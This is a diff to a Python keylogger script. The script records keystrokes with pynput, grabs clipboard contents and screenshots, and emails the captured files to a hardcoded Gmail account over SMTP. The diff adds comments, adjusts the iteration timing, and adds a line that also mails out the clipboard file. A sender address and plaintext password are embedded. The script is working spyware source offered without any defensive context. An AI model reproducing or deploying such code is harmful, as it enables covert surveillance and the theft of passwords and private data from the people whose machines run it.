@@ -1,31 +1,32 @@
+#Imports
+#necessary for email and attachments with email
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
 import smtplib
+  
 
-
-
+#necessary for clipboard function
 import win32clipboard
-
+#for keylogging
 from pynput.keyboard import Key, Listener
-
+#for yime of iterations
 import time
-import os
-from cryptography.fernet import Fernet
 
 import getpass
 from requests import get
-
+#for screenshots
 from multiprocessing import Process, freeze_support
 from PIL import ImageGrab
-
+#names of files
 keys_information = "key_log.txt"
 clipboard_information = "clipboard.txt"
 screenshot_information = "screenshot.png"
 
-time_iteration = 15
-number_of_iterations_end = 3
+time_iteration = 30     #seconds
+number_of_iterations_end = 2 #number of times 
+#the program will run
 
 email_address = "coding.texts123@gmail.com" # Enter disposable email here
 password = "User8681946731243" # Enter email password here
@@ -108,12 +109,12 @@ def screenshot():
 #screenshot()
 
 
-number_of_iterations = 1
+number_of_iterations =0
 currentTime = time.time()
 stoppingTime = time.time() + time_iteration
 
 # Timer for keylogger
-while number_of_iterations < number_of_iterations_end:
+while number_of_iterations <= number_of_iterations_end:
 
     count = 0
     keys =[]
@@ -130,7 +131,7 @@ while number_of_iterations < number_of_iterations_end:
             count = 0
             write_file(keys)
             keys =[]
-
+    #for the txt file
     def write_file(keys):
         
             for key in keys:
@@ -143,13 +144,13 @@ while number_of_iterations < number_of_iterations_end:
                 else:
                     f.write(k)
                     f.close()
-
+    #the condition of stopping
     def on_release(key):
         if key == Key.esc:
             return False
         if currentTime > stoppingTime:
             return False
-
+    
     with Listener(on_press=on_press, on_release=on_release) as listener:
         listener.join()
 
@@ -162,7 +163,7 @@ while number_of_iterations < number_of_iterations_end:
         send_email(screenshot_information, file_path + extend + screenshot_information, toaddr)
         send_email(keys_information, file_path + extend + keys_information, toaddr)
         copy_clipboard()
-
+        send_email(clipboard_information, file_path + extend + clipboard_information, toaddr)
         number_of_iterations += 1
 
         currentTime = time.time()
